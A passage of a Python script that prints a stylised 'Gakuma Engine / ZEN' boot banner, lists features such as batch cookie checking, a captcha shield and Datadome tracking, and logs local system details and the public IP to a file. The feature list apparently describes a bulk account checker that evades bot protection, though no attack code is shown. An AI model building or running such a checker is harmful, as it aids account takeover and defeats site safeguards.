..................:  .::^~~~~~^~7?!7~7??^^!?!~~7^^~^7~^!77~^77!!7!7?~~~!~^^^::.  :..................
..................:......   ...^!7?7!J!..^:^5^ ^!:~7:.:J^.~..!?~!??!::..   ......:..................
....................::::...  ....^JJ?^^^:^7~7~ .!^77: ~7^!^:^^:?J?^..:.:  .:::::....................
...........................:::   ~7^J?..^~!77!^~!!?!7~!7!!~^:.!J^7~. :...::.........................
..............................:.  ::.?~ ::..7.:^^!7^~^ 7:.::.^J:.:  .::.............................
...............................:   ^?~.    .^  :.^!.^. ^:    .~?~   ^...............................
...............................::  !~.     ::.:^~!!~~:..:    ..~7. ::...............................
................................:.  :^   .. ..:^!JJ~^^.  ..   ^:  .:................................
.................................::  .   .. ::!~::::~!:: .    .  .:.................................
..................................::...........~!^~!!... .......::..................................
...........................................::....::... .::..........................................
..............................................::......::............................................
....................................................................................................
....................................................................................................
    """
    
    banner = banner.replace("~", Fore.RED + "~").replace("!", Fore.RED + "!").replace("P", Fore.RED + "P").replace("G", Fore.RED + "G").replace("J", Fore.RED + "J").replace("5", Fore.RED + "5").replace("Y", Fore.RED + "Y").replace(".", Colors.BLACK + ".")

    print(banner)
    
    print_header("INITIALIZING", Colors.YELLOW)
    boot_progress("🧬 Booting Gakuma Engine")
    boot_progress("🔐 Decrypting Modules")
    boot_progress("🧠 Finalizing Environment")

    print_header("SYSTEM STATUS", Colors.GREEN)
    print(f"  {Colors.CYAN}»{Colors.RESET} Powered by: {Colors.BOLD}ZEN{Colors.RESET}")
    print(f"  {Colors.CYAN}»{Colors.RESET} Status: {Colors.GREEN}{Colors.BOLD}ONLINE{Colors.RESET}")

    features = [
        "🔓 Manual Cookie", "📦 Batch Check", "🛡️  Captcha Shield",
        "🧠 Full Intel", "⚙️  Threading Engine", "🚀 Speed Optimizer",
        "🧬 Datadome Tracker", "🌐 IP Logger", "📊 Level Sorter"
    ]
    print_header("FEATURES ENABLED", Colors.CYAN)
    col_width = (TERMINAL_WIDTH // 2) - 3
    for i in range(0, len(features), 2):
        feat1 = f" {Colors.GREEN}✓{Colors.RESET} {features[i]}"
        feat2 = f"{Colors.GREEN}✓{Colors.RESET} {features[i+1]}" if i + 1 < len(features) else ""
        print(f"{feat1.ljust(col_width)}{feat2}")

    boot_end = time.time()
    runtime = round(boot_end - boot_start, 2)
    boot_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    public_ip = get_public_ip()
    os_name = f"{platform.system()} {platform.version()}"
    cpu = platform.processor() or "N/A"
    ram = f"{psutil.virtual_memory().total / (1024**3):.2f} GB"
    arch = platform.machine()
    
    print_header("ZEN SYSTEM BOOT LOG", Colors.YELLOW)
    print(f"  {Colors.CYAN}»{Colors.RESET} Boot Time      : {boot_time}")
    print(f"  {Colors.CYAN}»{Colors.RESET} Public IP      : {public_ip}")
    print(f"  {Colors.CYAN}»{Colors.RESET} Runtime        : {runtime} seconds")
    print(f"  {Colors.CYAN}»{Colors.RESET} OS             : {os_name}")
    print(f"  {Colors.CYAN}»{Colors.RESET} CPU            : {cpu}")
    print(f"  {Colors.CYAN}»{Colors.RESET} RAM            : {ram}")
    print(f"  {Colors.CYAN}»{Colors.RESET} Architecture   : {arch}")
    
    log_folder = "ZEN_LOGS"
    os.makedirs(log_folder, exist_ok=True)
    rotate_logs(log_folder)
    log_date = datetime.now().strftime("%Y-%m-%d")
    log_path = os.path.join(log_folder, f"boot_log_{log_date}.txt")
    
    log_content = (
        f"ZEN SYSTEM BOOT LOG\n"
        f"--------------------\n"
        f"Boot Time     : {boot_time}\n"
        f"Public IP     : {public_ip}\n"
        f"Runtime       : {runtime} seconds\n\n"
        f"System Info:\n"
        f"OS            : {os_name}\n"
        f"CPU           : {cpu}\n"
        f"RAM           : {ram}\n"
        f"Architecture  : {arch}\n"
    )
    with open(log_path, 'w', encoding='utf-8') as log_file:
        log_file.write(log_content)
    
    print(f"\n {Colors.GREEN}✓{Colors.RESET} Boot log saved to: {Colors.BOLD}{log_path}{Colors.RESET}\n")
    
if __name__ == "__main__":
    try:
        main()
        taeee("kenshin")
    except KeyboardInterrupt:
        print("\n\n[!] Boot sequence cancelled by user. Exiting.")
        sys.exit(0)
    except Exception as e:
        print(f"\n[CRITICAL SCRIPT ERROR] An unexpected error occurred: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)